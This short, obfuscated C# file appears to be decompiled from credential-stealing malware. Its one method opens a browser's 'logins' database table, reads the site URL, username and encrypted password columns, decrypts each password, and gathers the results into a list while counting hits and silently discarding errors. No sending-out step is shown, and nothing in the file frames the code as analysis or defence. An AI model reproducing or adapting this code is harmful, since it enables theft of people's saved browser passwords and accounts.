using System.Collections.Generic;

internal sealed class Class93
{
	public static List<GStruct0> smethod_0(string string_0)
	{
		List<GStruct0> list = new List<GStruct0>();
		try
		{
			Class54 @class = Class55.smethod_0(string_0, "logins");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				GStruct0 item = default(GStruct0);
				item.String_0 = Class87.smethod_2(@class.method_0(i, 0));
				item.String_1 = Class87.smethod_2(@class.method_0(i, 3));
				string text = @class.method_0(i, 5);
				if (text != null)
				{
					item.String_2 = Class87.smethod_2(Class87.smethod_4(string_0, text));
					list.Add(item);
					Class36.int_0++;
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
